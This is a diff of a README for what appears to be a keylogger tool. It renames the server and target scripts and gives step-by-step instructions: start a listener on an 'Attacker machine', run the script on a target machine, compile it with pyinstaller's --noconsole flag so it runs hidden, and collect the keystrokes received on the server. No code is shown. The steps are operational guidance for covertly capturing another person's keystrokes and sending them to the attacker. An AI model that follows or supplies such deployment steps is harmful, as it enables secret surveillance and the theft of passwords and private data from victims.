@@ -38,12 +38,12 @@ pip install -r requirements.txt
 
 3. Run the command. This will do the basic setup of the server on Attacker machine:
 ```bash
-python ser.py
+python server.py
 ```
 
 4. Run as a Python script on target machine:
 ```bash
-python Wind_script.py
+python Target_script.py
 ```
 
 5. Run as a exe file on target machine (hidden):
@@ -52,7 +52,7 @@ pip install pyinstaller
 ```
 Move the pyinstaller to the file where Wind_script.py is located.
 ```bash
-pyinstaller.exe --onefile --noconsole Wind_script.py
+pyinstaller.exe --onefile --noconsole Target_script.py
 ```
 6. After running check the directory of the server for the received keystrokes. 
 
